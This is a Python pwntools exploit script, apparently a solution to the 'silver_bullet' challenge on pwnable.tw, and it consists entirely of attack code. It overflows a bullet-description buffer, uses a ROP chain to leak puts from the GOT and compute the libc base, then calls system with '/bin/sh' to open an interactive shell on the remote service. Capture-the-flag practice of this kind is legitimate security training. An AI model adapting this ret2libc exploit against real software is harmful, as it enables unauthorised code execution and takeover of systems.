from pwn import *
import sys

host = 'chall.pwnable.tw'
port = 10103
if len(sys.argv) > 1:
    r = remote(host, port)
else:
    r = process('./silver_bullet', env={'LD_PRELOAD': './libc_32.so.6'})

def create_bullet(desc):
    r.sendlineafter('Your choice :', '1')
    r.sendafter(':', desc)

def power_up(desc):
    r.sendlineafter('Your choice :', '2')
    r.sendafter(':', desc)
def beat():
    r.sendlineafter('Your choice :', '3')

def ROP(payload):
    create_bullet('a'*0x2f)
    power_up('a')
    power_up('\xff\xff\xff\x7f' + 'a'*3 + payload)
    beat()


sh_offset = 0xe5f7
system_offset = 0x3a940
puts_plt = 0x80484a8
puts_got = 0x804afdc
puts_offset = 0x5f140
main = 0x8048954


ROP(p32(puts_plt) + p32(main) + p32(puts_got))

r.recvuntil('win !!\n')
libc = u32(r.recvuntil('+')[0:4]) - puts_offset
log.info('libc: ' + hex(libc))

ROP(p32(libc+system_offset) + 'A'*4 + p32(libc+sh_offset))

r.interactive()
